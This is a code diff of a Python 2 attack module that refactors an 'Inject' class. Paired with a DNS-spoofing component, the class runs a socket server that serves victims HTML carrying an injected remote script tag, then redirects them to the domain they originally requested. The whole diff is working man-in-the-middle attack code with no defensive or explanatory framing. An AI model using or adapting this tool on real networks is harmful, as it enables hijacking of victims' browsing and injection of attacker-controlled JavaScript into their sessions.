@@ -26,6 +26,10 @@ import threading
 class Inject(object):
 
 	def __init__(self, host, port, js):
+                self.host = host
+                self.port = port
+                from dnspoisoner import DNSspoof
+                self.dnsspoof = DNSspoof(self.host)
                 if js != None:
                         self.js = js
                 else:
@@ -47,8 +51,6 @@ Content-Type: text/html
 <script src= {}></script>
 </head>
 """.format(self.js)
-		self.host = host
-		self.port = port
 
 	def start(self):
 		self.t = threading.Thread(name='Injection', target=self.server)
@@ -64,8 +66,6 @@ Content-Type: text/html
 
 	def server(self):
 		print "[+] Script Injection initialized."
-		from dnspoisoner import DNSspoof
-                self.dnsspoof = DNSspoof(self.host)
                 self.dnsspoof.start(None,"Inject")
 
 		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -76,7 +76,6 @@ Content-Type: text/html
 		server.listen(1)
 		for i in range (0,2):
 			if i >= 1:
-				print "[+] Script Injected on: ", client_address
 				domain = self.dnsspoof.getdomain()
 				domain = domain [:-1]
 				print "[+] Target was requesting: {}".format(domain)
@@ -87,6 +86,7 @@ Content-Type: text/html
 <meta http-equiv="refresh" content="0; URL='http://{}"/>
 </body>""".format(domain)
 					connection.send("%s" % redirect)
+                                	print "[+] Script Injected on: ", client_address
 					connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
 					connection.close()
 				except KeyboardInterrupt:
